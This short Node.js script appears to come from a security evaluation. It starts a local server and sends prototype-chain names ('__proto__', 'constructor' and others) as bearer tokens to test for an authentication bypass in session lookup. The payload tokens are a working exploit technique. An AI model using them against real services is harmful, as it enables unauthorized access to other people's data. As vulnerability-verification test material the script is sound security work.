// Added AFTER the run, to confirm a finding the run made that our probe did not plant:
// an auth bypass through a prototype-chain key in the session lookup.
import { createRequire } from 'node:module';
import path from 'node:path';
const dir = path.resolve(process.argv[2]);
const { createServer } = createRequire(path.join(dir, 'x.js'))(path.join(dir, 'server.js'));
const srv = await new Promise((r) => { const s = createServer(async () => new Response('')).listen(0, () => r(s)); });
const base = `http://127.0.0.1:${srv.address().port}`;
const rows = [];
for (const tok of ['__proto__', 'constructor', 'toString', 'hasOwnProperty']) {
  const r = await fetch(`${base}/api/invoices/1002`, { headers: { authorization: `Bearer ${tok}` } });
  rows.push({ token: tok, status: r.status, bypass: r.status === 200 });
}
srv.close();
console.log(JSON.stringify({ bypassed: rows.filter((r) => r.bypass).length, total: rows.length, rows }));
